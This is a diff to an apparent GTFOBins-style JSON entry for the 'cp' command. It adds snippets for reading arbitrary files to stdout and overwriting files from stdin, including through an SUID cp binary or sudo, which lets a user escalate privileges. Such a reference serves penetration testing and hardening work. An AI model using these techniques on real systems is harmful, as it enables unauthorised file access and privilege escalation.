@@ -1,13 +1,30 @@
 {
-  "description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges.",
   "functions": {
+    "file-read": [
+      {
+        "code": "cp \"[file]\" /dev/stdout\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "echo \"DATA\" | cp /dev/stdin \"[file]\"\n"
+      }
+    ],
     "suid": [
       {
+        "code": "echo \"DATA\" | ./cp /dev/stdin \"[file]\"\n"
+      },
+      {
+        "description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges.",
         "code": "TF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF [file]\n"
       }
     ],
     "sudo": [
       {
+        "code": "echo \"DATA\" | sudo cp /dev/stdin \"[file]\"\n"
+      },
+      {
+        "description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges.",
         "code": "TF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF [file]\n"
       }
     ]
